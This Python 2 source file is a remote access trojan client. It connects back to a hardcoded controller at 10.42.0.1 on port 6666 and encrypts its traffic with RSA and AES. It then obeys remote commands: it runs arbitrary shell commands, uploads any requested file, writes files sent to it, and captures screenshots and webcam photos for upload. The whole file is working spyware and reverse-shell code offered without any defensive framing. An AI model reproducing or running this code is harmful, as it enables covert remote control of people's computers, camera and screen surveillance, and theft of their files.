import socket
import subprocess
from time import sleep
import sys
from threading import *
import os
import gtk.gdk
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import AES
import base64
from gc import collect
from SimpleCV import Camera, Image

BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

screenLock = Semaphore(value=1)
secret = "oooooooooooooooooooooooooooooooo"
cipher = AES.new(secret)

# Generate a private key
def GenerateKey():                                             
	random_generator = Random.new().read
	key = RSA.generate(2048, random_generator)
	return key

#Generate the public key from the private one
def GeneratePublicKey(key):
	public_key = key.publickey()
	return public_key

# Convert the public key so that it can be sent
def PEMPublicKey(key):
	return key.exportKey('PEM')

Private_key = GenerateKey()
Public_Key  = GeneratePublicKey(Private_key)
Public_Key_to_send = PEMPublicKey(Public_Key)

def takepicture():
	cam = Camera()
	img = cam.getImage()
	img.save('picture.jpg')
	return 'picture.jpg'

def ComInit(s):
	global Public_Key_to_send
	global secret
	global cipher
	PEM_Public_key = s.recv(1024)
	Public_key_dest = RSA.importKey(PEM_Public_key)
	s.send(Public_Key_to_send)
	Public_key_dest = RSA.importKey(PEM_Public_key)
	secret = Private_key.decrypt(s.recv(1024))
	s.send(Public_key_dest.encrypt(secret,32)[0])
	cipher = AES.new(secret)


def takescreenshot():
	w = gtk.gdk.get_default_root_window()
	sz = w.get_size()
	pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
	pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
	if (pb != None):
		pb.save("screenshot.png","png")
	return "screenshot.png"

def fileUpload(client,path):
	global cipher
	print "Uploading"
	client.send(EncodeAES(cipher,"[+] Ready for Upload!"))
	response=DecodeAES(cipher,client.recv(1024))
	if "OK" in response:
		with open(path,"rb") as f:
			flag=1
			while flag:
				buff=f.read(736)
				if len(buff)<736:
					flag=0
				client.send(EncodeAES(cipher,buff))
				sleep(0.5)

def fileDownload(client,path):
	global cipher
	response=DecodeAES(cipher,client.recv(1024))
	if "Ready" in response:
		client.send(EncodeAES(cipher,"OK"))
	with open(path,"wb") as f :
		while 1:
			data_encoded = client.recv(1024)
			data = DecodeAES(cipher,data_encoded)
			f.write(data)
			if len(data_encoded) < 1024:
				break

def main():
	global cipher
	target_host = '10.42.0.1'
	target_port = 6666
	client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	client.connect((target_host,target_port))
	ComInit(client)
	client.recv(1024)
	client.send(EncodeAES(cipher,socket.gethostname()))
	client.recv(1024)
	while 1:
		response= DecodeAES(cipher,client.recv(1024))
		if 'GET' in response:
			todo,name,path=response.split('*$:')
			path=path.strip()
			fileUpload(client,path)
		elif 'CLOSE' in response:
			client.close()
			sys.exit(0)
		elif 'UP' in response:
			todo,name,path,pathToSave=response.split('*$:')
			fileDownload(client,pathToSave.strip())
		elif 'Screenshot' in response:
			path = takescreenshot()
			print "yes"
			fileUpload(client,path)
			os.system("rm "+path)
		elif 'TAKE' in response:
			path = takepicture()
			print "Yes"
			fileUpload(client,path)
			os.system('rm '+path)
		else:
			try:
				# name,cmd=response.split(":")
				# print cmd
				cmd=response.strip()
				try:
					command=subprocess.check_output(cmd, shell=True)
					client.send(EncodeAES(cipher,command))
				except:
					client.send(EncodeAES(cipher,"ERROR IN COMMAND!"))
			except Exception,e:
				client.send(EncodeAES(cipher,str(e)))
		collect()

if __name__=='__main__':
	main()
